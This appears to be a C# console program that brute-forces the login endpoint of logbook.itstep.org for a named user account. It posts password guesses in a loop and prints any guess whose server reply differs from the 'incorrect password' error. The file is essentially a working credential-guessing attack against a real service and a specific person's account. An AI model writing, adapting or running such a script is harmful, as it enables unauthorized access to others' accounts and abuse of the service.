using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace DemoJsomWebClient
{
    class Program
    {
        static void Main(string[] args)
        {
            //string urlApiGet = @"http://www.nbrb.by/API/ExRates/Rates?Periodicity=0";

            //HttpClient httpClient = new HttpClient();

            //var task1 = httpClient.GetStringAsync(urlApiGet);

            //task1.ContinueWith(p =>
            //{
            //    Console.WriteLine("GetStringAsync - Get All");

            //    string json = p.Result.ToString();
            //    Console.WriteLine($"JSON - {json}");
            //    List<dynamic> orders = JsonConvert.DeserializeObject<List<dynamic>>(json);
            //    Console.WriteLine($"Orders:");
            //    foreach (var order in orders)
            //    {
            //        Console.WriteLine(order);
            //    }
            //});

            HttpClient httpClient = new HttpClient();
            SelectionPassword selectionPassword = new SelectionPassword();
            string checkPassword = "";
            bool isChack = true;
            string urlPost = @"https://logbook.itstep.org/auth/login";
            string status = @"{""error"":{""password"":[""Incorrect user name or password""]}}";
            LoginMain loginForm = new LoginMain()
            {
                LoginForm = new Login()
                {
                    id_city = null,
                    username = "kirillemko",
                    password = checkPassword
                }
            };


            while (isChack)
            {
                loginForm.LoginForm.password = checkPassword;
                string jsonPost = JsonConvert.SerializeObject(loginForm);
                StringContent stringContent = new StringContent(jsonPost, Encoding.UTF8, "application/json");
                var task3 = httpClient.PostAsync(urlPost, stringContent);

                task3.ContinueWith(p =>
                            {
                                selectionPassword.SelectionPass(ref checkPassword, ref isChack);
                                HttpResponseMessage response = p.Result;
                                response.EnsureSuccessStatusCode();
                                response.Content.ReadAsStringAsync().ContinueWith(value =>
                                {
                                    Console.WriteLine(new string('-', 50));
                                    Console.WriteLine("PostAsync");

                                    Console.WriteLine($"{nameof(value.Result)} - {value.Result}");
                                    Console.WriteLine(checkPassword);
                                    if (!status.Equals(value.Result))
                                    {
                                        Console.WriteLine(checkPassword);
                                    }
                                });

                            }).Wait();
            }













            Console.ReadKey();
        }
    }
}
